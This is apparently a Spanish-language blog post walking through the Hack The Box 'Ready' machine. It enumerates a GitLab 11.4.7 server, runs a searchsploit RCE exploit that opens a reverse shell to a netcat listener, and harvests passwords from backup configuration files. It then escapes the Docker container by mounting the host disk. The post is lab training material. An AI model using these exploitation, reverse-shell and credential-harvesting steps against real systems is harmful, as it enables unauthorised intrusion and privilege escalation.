---
layout: post
title: HTB_Ready
date: 2023/07/10
slug: HTB_Ready
heroImage: /assets/machines.jpg
---

# Ready {-}

## Introduccion {-}

La maquina del dia se llama Ready.

El replay del live se puede ver aqui

[![S4vitaar Ready maquina](https://img.youtube.com/vi/DRSMsAKuXX0/0.jpg)](https://www.youtube.com/watch?v=DRSMsAKuXX0)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.220
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.220
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.220 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,5080 10.10.10.220 -oN targeted
```


| Puerto | Servicio      | Que se nos occure? | Que falta?           |
| ------ | ------------- | ------------------ | -------------------- |
| 22     | ssh           | Conneccion directa | usuario y contraseña |
| 5080   | http          | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.220
```

Es un nginx con gitlab y nos reporta un redirect al http://10.10.10.220/users/sign_in 

#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.220:5080 
```
 nos redirige automaticamente a la pagina de Sign in de gitlab Community edition.
Siendo un gitlab podemos ver el 
```bash
 robots.txt 
```
.

Vemos routas que pueden ser interesantes como

- /api


En el caso de la routa 
```bash
 /api 
```
 si tiramos de esta routa con firefox, vemos que necessitamos logearnos para continuar. Pero en ciertos casos,
hay possibilidades de poder, de forma no authenticada, obtener informaciones relevantes.

Si buscamos en google por 
```bash
 gitlab api 
```
, vemos de que manera podemos utilizar la api para recoger informaciones.

```bash
curl -s -X GET "http://10.10.10.220:5080/api/v4/version"
```

Aqui vemos que necessitamos un token y para esto tenemos que crearnos un usuario. Lo hacemos desde la web. Una vez hecho nos podemos loggear
y desde la interface de gitlab, si vamos a Settings, nos podemos crear un token. Lo copiamos y lo añadimos a un header con curl.

```bash
curl -s -X GET "http://10.10.10.220:5080/api/v4/version" -H "PRIVATE-TOKEN: 514gTTxhx3qpsBbJbfz9" | jq
```

Aqui vemos que la version de gitlab es la 11.4.7


## Vulnerability Assessment {-}

### Gitlab {-}

```bash
searchsploit gitlab 11.4.7
```

Aqui vemos exploits que nos permite hacer Remote Code Execution.


## Vuln exploit & Gaining Access {-}

### Ganando accesso con Gitlab {-}

```bash
searchsploit -m 49257
mv 49257.py gitlab_rce.py
vi gitlab_rce.py
```

Mirando el codigo, vemos que este exploit nos permiteria entablar una reverse shell. Modificamos los datos

- url de la maquina victima
- url de la maquina de atacante
- puerto de escucha
- usuario gitlab
- authenticity_token
- cookie de session.

El valor del authenticity token se puede encontrar en el codigo fuente de la pagina de gitlab.
El valor del cookie de session se puede ver en la pagina de gitlab dandole a 
```bash
 Ctrl+Shift+c > Almacenamiento 
```
 y podemos ver el 
```bash
 _gitlab_session 
```


1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos el script con el commando 
```bash
 python3 gitlab_rce.py 
```



```bash
whoami
#Output
git
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Podemos ir al directorio 
```bash
 /home/dude 
```
 y visualizar la flag
## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
id
sudo -l
echo $PATH
cd /
find \-perm -4000 2>/dev/null
hostname -I
hostname
```

Aqui podemos ver que el comando 
```bash
 hostname -I 
```
 nos da una ip que no es la ip de la maquina victima. Estamos en un contenedor

#### Escapar del contenedor {-}

```bash
cd /
ls -la
cd /opt
ls -l
```

Vemos un fichero 
```bash
 /root_pass 
```
 en la raiz, y en el directorio opt vemos un directorio 
```bash
 backup 
```
 y 
```bash
 gitlab 
```
.

```bash
cat /root_pass
#Output
YG65407Bjqvv9A0a8Tm_7w

su root
Password: YG65407Bjqvv9A0a8Tm_7w

su dude
Password: YG65407Bjqvv9A0a8Tm_7w
```

No es una contraseña.

```bash
cd /opt
ls 
cd /backup
ls -l

cat docker-compose.yml
cat gitlab-secrets.json
cat gitlab-secrets.json | grep "pass"
cat gitlab-secrets.json | grep "user"
cat gitlab.rb
cat gitlab.rb | grep "pass"
```

Hay mucha informacion en estos ficheros. El gitlab.rb contiene un password para el servicio smtp.

```bash
su root
Password: wW59U!ZKMbG9+*#h
whoami
#Output
root
```

Emos podido passar al usuario root pero del contenedor. Aqui algo que todavia suena turbio es este fichero 
```bash
 root_pass 
```
.
Buscamos en los ficheros la coincidencias de este fichero

```bash
grep -r -i "root_pass" 2>/dev/null
```

Aqui vemos un 
```bash
 /dev/sda2 
```
 que parece montado sobre un **root_pass**

```bash
df -h
fdisk -l
```

Aqui vemos que en 
```bash
 /dev/sda2 
```
 hay un linux filesystem de 18G que se monta directamente con 
```bash
 /root_pass 
```
. Vamos a intentar montarlo.

```bash
mkdir /mnt/mounted
mount /dev/sda2 /mnt/mounted
ls -l
cd /root
cat root.txt
```

Ademas podemos connectarnos como root directamente a la maquina victima con ssh porque tenemos accesso a la id_rsa del usuario root de la maquina
victima.
